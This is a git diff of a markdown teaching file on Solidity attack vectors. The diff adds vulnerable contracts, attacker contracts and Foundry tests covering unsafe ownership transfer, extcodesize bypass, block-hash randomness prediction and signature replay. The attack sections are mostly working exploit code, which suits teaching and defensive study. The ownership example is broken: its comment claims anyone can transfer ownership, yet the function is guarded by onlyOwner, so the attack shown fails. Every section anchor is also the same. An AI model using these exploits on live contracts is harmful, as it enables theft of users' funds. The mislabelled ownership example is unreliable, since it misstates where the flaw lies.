@@ -1,10 +1,5 @@
 ## 20 ATTACK VECTORS
 
-- [Typographical Error](#typography)
-- [Re-Entrancy Attack](#reentrancy)
-- [Center](#center)
-- [Color](#color)
-
 ## <font color="yellow"> Missing Access control  <a id="typography"></a></font>
 
 ### Description
@@ -589,6 +584,8 @@ contract DepositBox {
 }
  ```  
 
+In the above contract, the deposit function doesn't support or fulfil the requirements for adding users balances whichmakes it absolutely useless to the code because users can't deposit ether by calling the deposit function and it also has no fallback function implemented.
+
 ## <font color="yellow"> Unsafe Ownership Transfer in Smart Contracts <a id="typography"></a></font>
 
 ## Description:
@@ -605,7 +602,381 @@ Given the high stakes involved, transferring ownership must be handled with grea
 ## Code Example
 
 
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract VulnerableOwnership {
+    address public owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Caller is not the owner");
+        _;
+    }
+
+    // This function is vulnerable because it allows anyone to transfer ownership without any checks.
+    function transferOwnership(address newOwner) public onlyOwner {
+        require(newOwner != address(0), "New owner cannot be zero address");
+        emit OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+    }
+}
+
+```
+
+## Attack Contract
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IVulnerableOwnership {
+    function transferOwnership(address newOwner) external;
+}
+
+contract MaliciousAttack {
+    IVulnerableOwnership public vulnerableContract;
+
+    constructor(address _vulnerableContractAddress) {
+        vulnerableContract = IVulnerableOwnership(_vulnerableContractAddress);
+    }
+
+    // This function exploits the vulnerable contract by transferring its ownership to the attacker.
+    function attack(address _targetOwner) public {
+        vulnerableContract.transferOwnership(_targetOwner);
+    }
+
+    // This function initiates the attack to make the attacker the owner.
+    function attackToSelf() public {
+        vulnerableContract.transferOwnership(address(this));
+    }
+}
+```
+
+## <font color="yellow"> Floating Pragma <a id="typography"></a></font>
 
 
+## Description
+
+Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.
+
+## Code sample
+
+```
+pragma solidity ^0.8.20;
+
+contract PragmaNotLocked {
+    uint public x = 1;
+}
+```
+## Remediation
+
+```
+pragma solidity 0.8.20;
+
+contract PragmaNotLocked {
+    uint public x = 1;
+}
+
+```
+## <font color="yellow">  Bypass contract size Attack <a id="typography"></a></font>
+
+## Description
+
+In Solidity, smart contracts have an associated code size, which is the size of the bytecode stored on the blockchain. This code size can be queried using the extcodesize opcode, which returns the size of the code of a given address. This functionality is crucial for determining if an address is a smart contract and can affect how contracts interact with each other.
+
+## Code Sample
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+contract NoContract {
+    function isContract(address addr) public view returns (bool) {
+        uint256 size;
+        assembly {
+            size := extcodesize(addr)
+        }
+        return size > 0;
+    }
+
+    modifier noContract() {
+        require(!isContract(msg.sender), "no contract allowed");
+        _;
+    }
+
+    bool public pwned = false;
+
+    fallback() external noContract {
+        pwned = true;
+    }
+}
+
+contract Zero {
+    constructor(address _target) {
+        _target.call("");
+    }
+}
+
+contract NoContractExploit {
+    address public target;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function pwn() external {
+        new Zero(target);
+    }
+}
+```
+## Test Scenario
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+
+import {Test} from "forge-std/Test.sol";
+import {NoContract,NoContractExploit} from "../src/BypassContractSize.sol";
+
+contract NoContractExploitTest is Test {
+    NoContract private target;
+    NoContractExploit private exploit;
+
+    function setUp() public {
+        target = new NoContract();
+        exploit = new NoContractExploit(address(target));
+
+        vm.label(address(target), "NoContract");
+        vm.label(address(exploit), "NoContractExploit");
+    }
+
+    function test_pwn() public {
+        exploit.pwn();
+        assertTrue(target.pwned());
+    }
+}
+
+```
+
+
+## <font color="yellow"> Randomness manipulation <a id="typography"></a></font>
+
+## Description
+
+In Solidity, generating random numbers is a common requirement for applications like lotteries, games, and other forms of decentralized applications (DApps). However, obtaining truly random numbers in a deterministic environment like a blockchain is challenging. Solidity developers often resort to using variables such as blockhash, block.timestamp, or other block-related data to simulate randomness. Unfortunately, these methods are not secure and can be manipulated by malicious actors, leading to significant vulnerabilities.
+
+## Remediation
+
+The use of oracle networks like Chainlink network.
+
+
+## Code Sample
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+/*
+NOTE: cannot use blockhash in Remix so use ganache-cli
+
+npm i -g ganache-cli
+ganache-cli
+In remix switch environment to Web3 provider
+*/
+
+/*
+GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
+pseudo random number generated from block hash and timestamp.
+
+At first glance, it seems impossible to guess the correct number.
+But let's see how easy it is win.
+
+1. Alice deploys GuessTheRandomNumber with 1 Ether
+2. Eve deploys Attack
+3. Eve calls Attack.attack() and wins 1 Ether
+
+What happened?
+Attack computed the correct answer by simply copying the code that computes the random number.
+*/
+
+```
+
+contract GuessTheRandomNumber {
+    constructor() payable {}
+
+    function guess(uint256 _guess) public {
+        uint256 answer = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        if (_guess == answer) {
+            (bool sent,) = msg.sender.call{value: 1 ether}("");
+            require(sent, "Failed to send Ether");
+        }
+    }
+}
+```
+
+## Attack Path
+```
+contract AttackRandomnes {
+    receive() external payable {}
+
+    GuessTheRandomNumber public target;
+
+    constructor(address _target) {
+        target = GuessTheRandomNumber(_target);
+    }
+
+    function attack() public {
+        uint256 answer = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        target.guess(answer);
+    }
+
+    // Helper function to check balance
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+}
+```
+
+## <font color="yellow"> Signature Replay Attack <a id="typography"></a></font>
+
+
+## Description
+
+Understanding Off-Chain Message Signing in Solidity
+Off-chain message signing is a powerful technique in Ethereum smart contracts that allows a user to approve transactions or actions without directly interacting with the blockchain every time. This method provides several benefits, including reduced transaction costs and enabling gas-less transactions (also known as meta-transactions). However, it also introduces potential risks, such as the reuse of a single signature to execute a function multiple times, which may not be the signer's intention.
+
+## Code Sample
+```
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+
+interface ISignatureReplay {
+    function withdraw(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
+        external;
+}
+
+contract SignatureReplay {
+    address public immutable owner;
+    bool private locked;
+
+    constructor() payable {
+        owner = msg.sender;
+    }
+
+    modifier lock() {
+        require(!locked, "locked");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function withdraw(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
+        external
+        lock
+    {
+        require(verify(to, amount, r, s, v), "invalid signature");
+        payable(to).transfer(amount);
+    }
+
+    function getHash(address to, uint256 amount)
+        public
+        pure
+        returns (bytes32)
+    {
+        return keccak256(abi.encodePacked(to, amount));
+    }
+
+    function getEthHash(bytes32 h) public pure returns (bytes32) {
+        return
+            keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
+    }
+
+    function verify(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
+        public
+        view
+        returns (bool)
+    {
+        bytes32 h = getHash(to, amount);
+        bytes32 ethHash = getEthHash(h);
+        return ecrecover(ethHash, v, r, s) == owner;
+    }
+}
+
+
+```
+## Attack Part
+
+```
+
+contract SignatureReplayExploit {
+    ISignatureReplay immutable target;
+
+    constructor(address _target) {
+        target = ISignatureReplay(_target);
+    }
+
+    receive() external payable {}
+
+    function pwn(bytes32 r, bytes32 s, uint8 v) external {
+        target.withdraw(msg.sender, 1e18, r, s, v);
+        target.withdraw(msg.sender, 1e18, r, s, v);
+    }
+}
+```
+
+## Test Simulation
+```
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+
+import {Test} from "forge-std/Test.sol";
+import {SignatureReplay,SignatureReplayExploit} from "../src/SignatureReplay.sol";
+
+contract SignatureReplayExploitTest is Test {
+    SignatureReplay private target;
+    SignatureReplayExploit private exploit;
+    uint256 private constant PRIVATE_KEY = 999;
+    address signer;
+    address private constant attacker = address(13);
+
+    function setUp() public {
+        signer = vm.addr(PRIVATE_KEY);
+        deal(signer, 2 * 1e18);
+        vm.prank(signer);
+        target = new SignatureReplay{value: 2 * 1e18}();
+        exploit = new SignatureReplayExploit(address(target));
+        vm.label(address(target), "SignatureReplay");
+        vm.label(address(exploit), "SignatureReplayExploit");
+    }
+
+    function testSignatureReplay() public {
+        bytes32 h = target.getHash(attacker, 1e18);
+        bytes32 ethHash = target.getEthHash(h);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PRIVATE_KEY, ethHash);
+
+        vm.prank(attacker);
+        exploit.pwn(r, s, v);
+
+        assertEq(address(target).balance, 0);
+    }
+}
+
+```
 
 
